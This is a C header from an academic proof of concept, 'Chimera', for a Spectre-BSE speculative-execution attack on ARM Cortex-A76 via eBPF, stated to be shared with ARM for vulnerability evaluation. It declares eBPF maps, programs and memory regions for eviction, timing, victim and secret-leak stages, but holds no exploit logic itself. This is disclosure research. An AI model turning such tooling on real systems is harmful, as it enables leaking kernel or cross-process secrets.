/*
 * Chimera: Spectre-BSE PoC based on eBPF
 * 
 * Thursday, January 22nd 2025
 *
 * Yuhui Zhu - yuhui.zhu@santannapisa.it
 * Alessandro Biondi - alessandro.biondi@santannapisa.it
 *
 * ReTiS Lab, Scuola Superiore Sant'Anna
 * Pisa, Italy
 * 
 * This copy is tested on Cortex-A76 and distributed to ARM 
 * for vulnerability evaluation.
 */

#ifndef __EBPF_PROGS_H__
#define __EBPF_PROGS_H__

#include "ebpf_helper.h"
#include "arch_defines.h"

#define PARAM_OFFSET_SET_PTR    (0 * SIZE_CACHE_STRIDE)
#define PARAM_OFFSET_ESC        (1 * SIZE_CACHE_STRIDE)

#define PARAM_OFFSET_NO_FLUSH   (2 * SIZE_CACHE_STRIDE)
#define PARAM_OFFSET_SHUFFLE_BH (PARAM_OFFSET_NO_FLUSH + 0 * sizeof(uint8_t))
#define PARAM_OFFSET_TAKE_SC    (PARAM_OFFSET_NO_FLUSH + 1 * sizeof(uint8_t))
#define PARAM_OFFSET_PTR        (PARAM_OFFSET_NO_FLUSH + 2 * sizeof(uint64_t))
#define PARAM_OFFSET_RSH        (PARAM_OFFSET_NO_FLUSH + 3 * sizeof(uint64_t))

/**
 * environment parameters
 */
extern int env_page_sz;

/**
 * eBPF handlers
 */
extern int fd_map_frbuf;
extern int fd_map_evict_offset;
extern int fd_map_time;
extern int fd_map_jmptable;
extern int fd_map_bh_params;
extern int fd_map_dummy;
extern int fd_map_secret;

extern int fd_prog_evict, sock_prog_evict;
extern int fd_prog_time, sock_prog_time;
extern int fd_prog_dbg_load, sock_prog_dbg_load;
extern int fd_prog_t_safe, sock_prog_t_safe, fd_prog_t_leak;
extern int fd_prog_bh_populate, sock_prog_victim;

extern void *ptr_mmap_evset, *ptr_mmap_bh_params, *ptr_mmap_jmptable, *ptr_mmap_dummy, *ptr_mmap_secret;
extern uint32_t *ptr_mmap_time;

void setup_prog_reload();
void setup_prog_victim(int nr_bh, int sz_bcond_offset);

void setup_prog_dbg_load();

#endif